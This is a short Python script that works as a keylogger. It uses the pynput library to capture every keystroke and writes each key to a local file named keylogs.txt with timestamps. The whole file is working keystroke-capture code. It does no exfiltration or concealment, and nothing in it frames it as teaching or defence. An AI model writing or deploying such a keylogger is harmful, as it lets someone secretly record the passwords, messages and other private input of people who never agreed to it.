import colorama
import logging
from pynput.keyboard import Key, Listener
def key_logger():
    try:

        log_dir = ""

        logging.basicConfig(filename=(log_dir + "keylogs.txt"), \
            level=logging.DEBUG, format='%(asctime)s: %(message)s')

        def on_press(key):
            logging.info(str(key))

        with Listener(on_press=on_press) as listener:
            listener.join()
    except KeyboardInterrupt:
        print('\033[45m [ + ]'+"SHUTTING DOWN PROGRAM")

if __name__ == "__main__":
    key_logger()